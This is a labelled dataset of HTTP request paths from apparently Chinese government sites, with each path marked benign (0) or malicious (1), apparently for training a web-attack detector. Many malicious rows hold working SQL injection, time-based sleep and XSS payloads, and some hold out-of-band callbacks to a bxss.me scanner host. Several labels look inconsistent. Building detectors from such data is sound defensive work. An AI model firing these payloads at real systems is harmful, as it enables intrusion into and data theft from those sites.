request	label
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u871c\u96ea\u51b0\u57ce\u996e\u54c1\u5e97	0
/***/0/00/36/17/361715_123833.png	1
/****/20200403/javascript:void(0);	1
/****/web/search?page=2&channelid=253477 and 7151=9841#&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10	1
/****/2020\ufffd\ufffd	0
"/****/abantecart/index.php?limit=""><script>alert(777);</script>&page=1""><script>alert(777);</script>&rt=product/special""><script>alert(777);</script>&sort=""><script>alert(777);</script>"	1
"/****/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/***/com/menu/images/l1.gif	0
/**/news/xwygx/202109/t20210930_318020.html' and 'x'='x	1
/****/2020jnxc/yxzp/202006/w020200701487301513936.jpg	0
/**********/system/2021/11/05/javascript:void(0);	1
/******/form/selbtn_disabled.jpg	0
/*******/qiye/businesses-e52063_33.html?category_id=	0
/**/system/2021/12/06/012227651.shtml	0
/****/bmkx/scl/202108/url	0
/*****/kjcx/kycg/zdkjcg/gjcp/clhlbj/xxgk/qyzdsx/gygj/jtgg/dsh/	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5546\u9f99\u9f99\u533b\u7597\u7528\u54c1\u5e97	0
/****/http://bxss.me/t/xss.html?	1
/****/gjdjbn/djbn_gjjs/202110/t20211019_319175.html	0
"/*/201020-1/videos-detail/'""""()&%<acx><script >edjc(9891)</script>f1a343e891a0a00a940d84f9626bcf.js"	1
/zwxx_11337/****/202005/t20200528_2104052.html	0
/****/web/search?searchword=1&channelid=287219&perpage=24%' or 8940=8940	1
"/****/czgk/bmjs/zzqfyxt/plxrmfy/\""javascript:void(0)\"""	1
/***********/zaojianpinglun/?_=1640026212442	0
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 5633=5633-- uyut	1
/****/20170830/javascript:void(0);	1
"/**/index.cfm?error.diagnostics="""">alert(777)"	1
/********/slash-cms/index.php?mod=sl_pages&id=alert(777)	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5c0f\u6797\u624b\u5de5\u9762\u5e97	0
/*****/system/2020/07/28/javascript:void();	1
/****/xxgkml/qtfdxx/zcjd/qwjd/202007/t20200721_169548_wap.html	0
/*******/202011/202011031617221157.html	0
/******/system/2020/10/16/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4e2a\u4f53\u7ecf\u8425\u4eae\u4eae\u7efc\u5408\u8d85\u5e02	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u540c\u76ca\u95e8\u4e1a\u7ecf\u9500\u90e8	0
/***/003/003/728/00300372842_eab99796.jpg	0
"/****/advanced-search/?term=asdf&""><script>alert(777)</script>"	1
"/************/template/jcse/110105008056111<esi:include src=""""http://bxss.me/rpb.png""""/>/16/images/searchbtn.js"	1
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/202106/t20210628_2902982.html	0
/if(now()=sysdate(),sleep(15),0)/*****/1088/1110/list.html	1
/*******/eg4v4ji5.php	1
/****/zzxxgk/jjhzj/sqgk/cyfz/	0
"/images"""" and 2*3*8=6*8 and """"u3bu""""=""""u3bu/**/jquery.js"	1
/****/zhengce/zfwjn/201809/w020180930440556115314.jpg	0
/**********/system/2021/01/11/013317857.shtml	0
/**/p291255.jar	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u5fd7\u987a\u5546\u884c	0
/******/swqh/js/jquery-1.4a2.min.js	0
/******/457/language.js	0
/zwxx_11337/****/202111/t20211112_3125695_zzb.html	0
"/***/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=6d27f""""><script>alert(777)</script>894ba&type=&width="	1
/****/bysw/202007/w020200701582130308802.jpg	0
/**/mswpmm/common/newaccount.aspx?ddlculture=alert(777)	1
/***/003/004/472/00300447281_b8436503.jpg	0
/****/xqldly/hfbysj/202002/t20200209_147733.html	0
/****/20201202/e111519931.html	0
/*******/201908/201908090959181018.html?agt=16651	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' and 9814=0234 and '%%'='%	1
"/'""""()&%<acx><script >iubl(9063)</script>/**/lib/easyui/themes/bootstrap/messager.css"	1
/**********/system/2020/12/08/013298511.shtml	0
/**********/system/2020/03/20/013120448.shtml	0
/****/system/count/0036001/012000000000/window.location.href	1
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsthjt/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u957f\u798f\u6765\u526f\u98df\u5546\u5e97	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5f66\u6e05\u5efa\u6750\u79df\u8d41\u9500\u552e\u90e8	0
/**/ourbusiness/projectcontracting/201412/t20141210_22195.html	0
/zwxx_11337/****/201605/w020170728411774950697.jpg	0
/******/usercenter/index?qrcode=23130	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') or 9215=7103 and '%'='	1
/****/rcgk/javascript:stranbody();	1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqzfbgt/202002/t20200228_1972772.html	0
/************/template/jcse/bxss.me/16/images/ui.css	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u5fd7\u98de\u4e2d\u836f\u6750\u6709\u9650\u516c\u53f8	0
/****/zfxxgk/fdzdgknr/tjxx_40901/zxfb/201802/t20180211_689386.html	0
"/******/_content/download.jsp?owner=1707212448&urltype=0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z&wbfileid=67726"	1
/**********/system/2021/10/22/013468169.shtml	0
/***/0/02/08/99/2089964_803500.png	0
"/******/jslib/ckplayer/ckplayer.js/""><script>alert(896)</script>?_=1630311635977"	1
/****/zfxxgk/zfxxgkzn/	0
/******/jslib/if(now()=sysdate(),sleep(15),0)/urite.min.js	1
"/******/qhkc/"" target=""_blank""><img src=""img3/7.jp"	1
/******/gjcp/hbsb/lxwm/qywh/sjsb/rssdy/nbfw/yqlj/rlzy/kjcx/kycg/zscq/xxgk/qyjbxx/images/jianfan.js	0
/******/xzcf/gys_33720/ldx_33796/scjdglj_33813/index.html	0
/****/byysqgk/	0
/**********/system/2020/05/26/013171016.shtml	0
/****/bmkx/sgsj/201710/t20171026_96442.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u94f6\u6e2f\u5de5\u8d38\u9752\u94dc\u5ce1\u5f00\u53d1\u90e8	0
"/***/group-summary.jsp?search=test"" onmouseover=alert(777) x="""	1
/*******/9616h.php	1
/****/	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u73b2\u5a1c\u8d1d\u513f	0
/*******/taglib/yunke.php	1
/****/tzgg/202002/w020210813354743903299.png	0
/****/czgk/czyjs/202102/p020210220418074909622.pdf	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u7ecf\u6d4e\u5f00\u53d1\u533a\u4f2f\u4e50\u8bc6\u8f66\u4e8c\u624b\u8f66\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8	0
/****/gccb/hjgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/czgk/bmjs/sydw1/zzqlswzcb	0
/******/2012wmljx/jrlj/	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5c39\u5927\u53d4\u9910\u5385	0
/****/xxgkml/rsrm/201804/t20180409_102232.html	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u77f3\u7a7a\u9547\u5c0f\u5f20\u9910\u5385	0
/****/zzxxgk/wsjkwyh/ggxcc/202003/w020200318647774782090.jpg	0
/****/wdsjs/hfswsj/202105/t20210522_182885.html	0
/****/qzfwj/5619/5634/index_1.html	0
/****/shouji/65807.htm?rand=2 and 9160=9160-- cltx	1
/****/category/silutouzi?page=_cloud_eye_trainer_56524eb847014a30f03212dadb9defb9	1
/******/resource/code/datainput.jsp?owner=1329914701&e=1&w=1600&h=1600&treeid=1164&refer=&pagename=l254anpnci9jennjl2nvchlfmv91c2vyx2xpc3quannw&newsid=-1	0
/********/fortunewheel/wechat/callback?code=011hssll23z6l84ccyll2yl4qb1hssla&state=41b846ff630241659961e94c206a0dad	0
/******/public/2021/12/20/112682.images/v112682_b1639962162554.jpg	0
/****/whs/yw_1286/202012/t20201203_2390585.html	0
/******/public/2021/12/01/20211201_17d74c3f2c6_r1_1200k.mp4	0
/*****/system/2021/12/18/javascript:window.close();	1
/****/xxgknb/2017/bmnb2017/201802/t20180207_100113.html	0
/******/cms/www/201611/17124627ntkr.jpg	0
"/****/czgk/bmjs/qtdw/?wvstest=javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")://javascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")httpjavascript:domxssexecutionsink(1,""""'/""""><xsstag>()locxss"""")"	1
/****/gjdjbn/djbn_zypl/index_5.html	0
/******/xxsjd/qwjd/	0
/*****/gy42/ljcpgyview.asp?id=29702330&l2=\ufffd\ufffd\ufffd\ufffd&l=\u027d\ufffd\ufffd	0
"/****/czgk/bmjs/zzqrdcwh/\""javascript:void(0)\"""	1
/****/czgk/bmjs/zzqfyxt/ldxrmfy	0
/****/zt/msss/msxw/201712/t20171214_637327.html	0
/*******/qiye/b-e1484145.html	0
/*****/system/2020/12/01/javascript:void();	1
/**/system/2021/12/20/012231902.shtml	0
/***/003/004/386/00300438683_ccf6ddde.jpg	0
/*****/spxw/	0
/******/system/2021/10/15/013464843.shtml	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4ed9\u5a25\u519c\u5bb6\u996d\u9986	0
/****/shzr/zrbg/201411/p020210117703011789976.pdf	0
/***/0/01/92/47/1924754_756984.jpg	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5c0f\u95eb\u9972\u6599\u7ecf\u9500\u90e8	0
/****/category/fengxianfangfan?page=1 and 2915=2915#	1
/*****/genixcms-master/genixcms-master/gxadmin/index.php?page=posts&q=1'alert(777)	1
/****/system/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/**********/system/2020/05/26/013170593.shtml	0
/zwxx_11337/****/202004/t20200417_2037784.html	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u8c28\u6b63\u53f8\u6cd5\u9274\u5b9a\u4e2d\u5fc3(\u6709\u9650\u516c\u53f8)	0
/****/gccb/jcgc/images/p020141121379218050561.png	0
"/****/dorg/results.php?q='""--></style></script><script>alert(777)</script>&search=search&type=3"	1
/****/2011jtdt	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u676f\u8a00\u8336\u8bed\u996e\u54c1\u5e97\u5927\u9605\u57ce\u5e97	0
/*/public/viewclick/?addclick=1&classid=1 waitfor delay '0:0:9.468' -- &id=174	1
/****/tzgg/gzxwtzgg/201412/t20141218_40490.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u7231\u7ef4\u65af\u9152\u5427	0
/zwxx_11337/****/202109/t20210901_2999493.html	0
/__local/*/c6/bf/62e528fafb15a2a29beb7fec7d3_ca39823b_8fb5.png	0
/******/system/2021/09/13/javascript:window.print()	1
/****/xxgkml/qtfdxx/zcjd/qwjd/201904/t20190417_116740_wap.html	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5982\u610f\u7efc\u5408\u5546\u5e97	0
/***/0/01/95/80/1958090_293927.jpg	0
/****/20201009/e108109965.html	1
/******/_content/download.jsp?urltype=news.downloadattachurl') or 8892=4705 /*&owner=1707212448&wbfileid=51419	1
/zwxx_11337/****/201809/t20180921_1070928.html	0
/*******/qiye/businesses-e45059_2.html?category_id=242754	0
/******/system/2016/08/25/javascript:void();	1
/******/system/2018/02/01/javascript:void();	1
/**********/system/2021/12/17/013495648.shtml	0
"/****/xqdt/hnx/201811/"""	0
/**/system/2021/01/21/012117379.shtml	0
/****************/images/common/default/ico_coupon_used.png	0
"/***/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
/**********/system/2021/12/17/013495654.shtml	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4e49\u6d77\u8282\u6c34\u704c\u6e89\u914d\u4ef6\u7ecf\u9500\u90e8	0
/****/1.htm	0
/****/zt/2017nb/sjzf/201803/p020180321373655149236.pdf	0
/******/system/2019/07/26/012936476.shtml	0
/****/zt/2019wznb/zzqbm/202001/p020200116638760330597.pdf	0
/***/0/01/55/00/1550081_944356.png	0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9b45\u8863\u9601\u9488\u7ec7\u54c1\u644a\u70b9	0
/***/frontpage.do?title=\u8fc7\u5e74&view=staticfile/searchpath/hotlabel	0
"/****/telaen/index.php?tid=default&lid=en_uk&f_email="""">alert(777)"	1
"/***/news/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
/**********/system/2021/11/11/013478617.shtml	0
/****/zgsdt/gzxwzgsdt/index_3.html	0
/****/\ufffd\u0436\ufffd\ufffd\ufffd\ufffd\ufffd	0
/******/system/2015/12/11/011885715.shtml	0
"/**********/system/2021/09/07'""""/><script>alert(758)</script>/013447361.shtml"	1
/************/search.do?category=1&cateid=40&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&q=«Î ‰»Îπÿº¸¥ &tpl=16&websiteid=110105008056111	1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u533a\u5de5\u77ff\u914d\u4ef6\u4f9b\u5e94\u7ad9	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u666f\u6e56\u4eba\u5bb6\u8d85\u5e02	0
/__local/*/ed/76/24f09a34e3b2309e9c90dedbb0a_96d05871_1b4df8.rar?e=.rar	0
/*********/treasury/index.aspx?nodeid=394%';select sleep(5)	1
/**********/system/2021/07/30/013428260.shtml	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtneek5fu/cvipwoqjfeydr8=&openid=ovl7jjnnnqvr7heo6a7tw0cy6qqa&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb2rcbfg2w/pnu 1/6agi5wpoo8dbj5 fzedtzplsmcarb6cbwjoaaafwu/vxczft7o81eqpv7vnupdbivmfngjm=	0
/zwxx_11337/****/202104/t20210430_2816216.html	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtnrizffaggvsspn8aekfmks=&openid=ovl7jjs1a-eizwldc8enl5d8h2gq&activate_ticket=fdzv9emqaffrnr3xboqhb9tvnyo2byvdwuxg bveslfoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi21/bpyblzkqyhuk6uh4qye=	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u9a6c\u5ead\u8d35\u5e9f\u54c1\u6536\u8d2d\u70b9	0
/***/0/01/93/67/1936746_312519.jpg	0
/****/yd/yw_1280/202006/t20200628_2146883.html	0
/******/index-bg_02.jpg	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5954\u9a704s\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u79c0\u8272\u53ef\u9910\u996e\u54c1\u5229\u6c11\u8857\u5e97	0
/****/xqdt/hnx/202003/t20200309_148938.html	0
/***/portal?act=yq°¡=1	0
/****/gjmt/jtwxq/202012/t20201201_264201.html and 1=1	1
/**/system/2021/01/31/012123146.shtml	0
/****/javascript:void(0);	1
/******/system/2012/05/30/010783070_01.shtml	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19107777282220405779_1639972975033	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u58f9\u6bd4\u58f9\u5962\u534e\u9986	0
/************/interfaces/dimension.do?begin=&end=&eq=&oq=&p=1&pg=if(now()=sysdate(),sleep(15),0)&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111	1
/zwxx_11337/***/201712/t20171218_640278.html	0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u987e\u840d\u4e3d\u901a\u8baf\u90e8	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u59dc\u5f00\u6167\u8d27\u7269\u8fd0\u8f93\u90e8	0
/******/system/2018/01/20/javascript:window.close();	1
/*******/qiye/b-e2353077.html	0
/******/zsn/zyls/	0
/***/0/01/83/07/1830732_956204.jpg	0
/****/gjmt/zgsmt/201503/w020150304526353573848.jpg	0
/***/0/00/93/65/936587_952378.png	1
"/ldzc'""""()&%<acx><script >aavn(9571)</script>/*****/sz/202108/t20210806_185416.html"	1
/**********/system/2021/12/18/013496226.shtml	0
/***/mobile_h5/wapshouye.do?channelid=chuanmei/meishijie	0
"/***/getsubject?data={""subject_id"":527,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":377213,""sign"":""""}"	0
"/****/ssgs/"" and ""x""=""y"	1
/****/sz.php	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u9752\u9547\u4fe1\u7528\u793e\u4f59\u6865\u5206\u793e	0
"/****/czgk/bmyjs/gdyx/nxdx/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a>"	0
/************/fxglzgs/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/2017-01-24/193.html	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5b8f\u7a0b\u79be\u949f\u8868\u7535\u5668\u7ecf\u9500\u90e8	0
/******/zzq_xxgk_fzicon.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9686\u5609\u76db\u5546\u884c	0
/*****/system/2021/02/01/013330291.shtml	0
/****/zfxxgk/fdzdgknr/qtfdxx/zfgzbg_40932/201808/t20180830_1025073.html	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u9c81\u5546\u77f3\u6750\u7ecf\u9500\u90e8	0
/****/jtdt/2010jtdt/201412/t20141218_39229.html	0
"/****/czgk/bmjs/rmtt/tw/202008/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a>"	0
/****/czgk/bmyjs/qtdw/zzqsbj/202002/t20200204_1941247.html	0
/******/uploadpic/image/20190603/1559545664130239.jpg	0
/*******/tnnwaoro.php	1
/**********/system/2021/12/15/013494586.shtml	0
"/***/abantecart/index.php?currency=""><script>alert(777);</script>&product_id=109""><script>alert(777);</script>&rt=product/product"	1
"/**/ui/lib/'""""()&%<acx><script >vrou(9770)</script>/themes/bootstrap/linkbutton.css"	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5b81\u4e1c\u6d77\u6f6e\u5e9f\u65e7\u7269\u8d44\u6536\u8d2d\u7ad9	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsft	0
/****/web/search?channelid=234439&orderby=relevance&perpage=24) and 4015=4015#&searchword=1	1
/***/0/11/37/70/11377077_964578.jpg	1
/zwxx_11337/****/202006/t20200605_2129519.html/index_1.html	0
/***/003/004/446/00300444664_8d67bfdb.jpg	0
"/****/category/silulvyou?page='""""()&%<acx><script >ydch(9090)</script>"	1
/****/czgk/bmjs/gdyx/nxdx/202103/t20210309_2620412.html	0
/****/0v8his-syxw-e117190015.html	0
/******/system/2020/07/31/javascript:window.print()	1
/****/jcgj/201411/w020141125645793032892.jpg	0
"/***/index.cfm?email="""">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u80e1\u8fd0\u6c11\u732a\u8089\u5e97	0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u03ed \ufffd\ufffd\ufffd	0
/**********/system/2021/12/16/013495497.shtml	0
/**********/system/2020/05/10/013158193.shtml	0
/****/whhd/201412/t20141218_48037.html	0
/****/zxjx/yjsb/201411/w020141125632140822424.jpg	0
"/**********/system/2021/09/07/013447361'""""/><img src=x onerror=alert(823)>.shtml"	1
"/***/libs/magpierss/scripts/magpie_simple.php?url=""""><img src= x onerror = alert(777)>url="""">"	1
/****/zhengce/zfwjn/201801/p020211203416440992402.pdf	0
/**/mlqlh/index.shtml	0
/****/shzr/zrbg/	1
"/****/bysw/201907/t20190704_139319.html?leader="""" """"a"""".concat(70-3).concat(22*4).concat(98).concat(81).concat(106).concat(82) (require""""socket""""
socket.gethostbyname(""""hitjo"""" """"xiolufkld337e.bxss.me."""")[3].to_s) """""	1
/******/quyu	0
/***/interface/comul_total.json.jsp?callback=jquery19101804226392124182_1639980524502	0
"/******/dashboard/index/41730?did=4&period=3"""">alert(/777/)"	1
/****/20200724/e104009330.html	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(102).concat(87).concat(114).concat(84) (require""""socket""""
socket.gethostbyname(""""hitxj"""" """"smoajdhua2d6f.bxss.me."""")[3].to_s) """"/********/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js"	1
/***/interface/daily_clickcount.json.jsp?callback=jquery19105086359616364957_1640035068168	0
/**********/system/2020/04/21/013145214.shtml	0
"/******/visitcount/visit.jsp/<img src=""javascript:alert(2076)"">?type=3&i_webid=1&i_columnid=392&i_articleid=192569"	1
/****/czgk/bmyjs/zzqfyxt/ycxzjrmfy/201802/t20180223_692916.html	0
/****/web/search?searchword=-1 or 2295=2295#&channelid=287219&perpage=24&templet=1&token=1	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u8309\u8389\u6d17\u5316\u914d\u9001\u4e2d\u5fc3	0
/****/tzgg/tz16/201607/t20160722_89837.html	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqjgswglj/zfjgswglj/201802/t20180223_692984.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u592a\u897f\u540c\u76ca\u94f8\u94a2\u5236\u9020\u5382	0
/****/202112/t20211219_3234984.html	0
/****/zjdt/czjs/if(now()=sysdate(),sleep(12),0).htm	1
/****/gggs/201903/t20190318_115291.html	0
/****/÷–π˙ºı∆∂—ß	1
/****/xqldly/hfbyqz/202008/t20200806_170890.html	0
"/****/admin/system.html?step=2&device=et""/><script>alert(777);</script>bh0"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u8fc5\u78ca\u7ef4\u4fee\u5b89\u88c5\u6709\u9650\u516c\u53f8	0
/****/consultdetails/canada	1
/****/web/search?channelid=222832&searchword=\u9686\u6e56\u5f00\u53d1\u533a\u8fd0\u8f93\u8f66\u961f	0
/****/201909/t20190926_1757637.html	0
/****/ghgz/202111/t20211110_320310.html	0
/***/mobile_h5/waparticledetail.do?article_id=202007141602131138&contenttype=article	0
/****/jtdt/2013jtdt/index_4.html	0
/******/download/downfile.jsp?classid=0&filename=278851335f24465a9715e09ab5f36d60.docx and 4422=4422-- mbyg	1
/**/ui'||'/lib/easyui/themes/bootstrap/panel.css	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u770b\u770b\u526f\u98df\u5546\u5e97	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a(\u5357)\u5c0f\u674e\u5b50\u51c9\u76ae\u9ebb\u8fa3\u70eb\u5e97	0
/****/6cvktm-article-e114635021.html	0
/****/bmkx/swjw/202112/w020211218471508753765.jpg	0
"/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqdwbgt/\""javascript:void(0)\"""	1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6768\u7434\u65e9\u70b9\u90e8	0
/******/system/2016/09/18/012133692.shtml	0
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 2277=4310	1
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=31&i_articleid=17195	0
